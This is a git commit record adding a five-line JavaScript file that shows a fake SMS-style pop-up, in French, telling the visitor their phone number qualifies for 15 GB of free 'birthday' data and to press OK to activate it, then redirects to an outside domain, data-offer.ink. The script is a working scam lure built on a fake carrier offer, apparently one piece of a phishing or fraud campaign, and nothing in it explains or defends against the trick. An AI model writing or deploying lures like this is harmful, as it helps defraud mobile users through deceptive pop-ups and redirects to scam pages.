5e2304292bf3450e7ca0467532641950f5310021
katemj25 <mbokofficial1@gmail.com>
2025-05-28 17:14:31 -0700

    Create activer-anniversaire15go.com.js

---
+++ activer-anniversaire15go.com.js
@@ -0,0 +1,5 @@
+var password = '15 Go de données anniversaire'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 15 Go de données gratuites pour son anniversaire. Veuillez appuyer sur OK pour ACTIVER. ','15 Go de données anniversaire');
+if (password != '15 Go de données anniversaire') {
+location.href='https://data-offer.ink/activer-anniversaire15go.com.html';
+}
